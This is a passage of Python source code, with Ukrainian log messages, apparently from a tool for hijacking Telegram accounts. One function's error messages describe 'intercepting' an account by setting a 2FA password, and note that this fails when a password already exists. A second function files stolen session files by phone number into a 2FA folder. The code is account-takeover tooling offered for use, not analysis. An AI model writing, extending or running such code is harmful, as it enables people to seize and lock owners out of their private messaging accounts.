        logger.error("❌ Помилка: На акаунті вже є пароль. Неможливо перехопити без старого пароля.")
        return False, "На акаунті вже є 2FA. Перехоплення неможливе."
    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб. Зачекай {e.seconds} секунд і спробуй знову."
        logger.error(error_msg)
        return False, error_msg
    except Exception as e:
        logger.error(f"❌ Помилка при перехопленні акаунту: {e}")
        return False, str(e)


def move_session_to_2fa(phone: str, source_folder: str, dest_folder: str):
    """
    Переміщує сесійний файл у папку для сесій з 2FA.
    """
    session_name = f"{phone.replace('+', '')}.session"
    source_path = os.path.join(source_folder, session_name)
    dest_path = os.path.join(dest_folder, session_name)

    try:
        os.makedirs(dest_folder, exist_ok=True)
        shutil.move(source_path, dest_path)
        logger.info(f"✅ Сесію для {phone} переміщено до {dest_folder}")
        return True
    except FileNotFoundError:
        logger.error(f"❌ Сесію для {phone} не знайдено в {source_folder} для переміщення.")
        return False
    except Exception as e:
        logger.error(f"❌ Помилка при переміщенні сесії {phone}: {e}")
        return False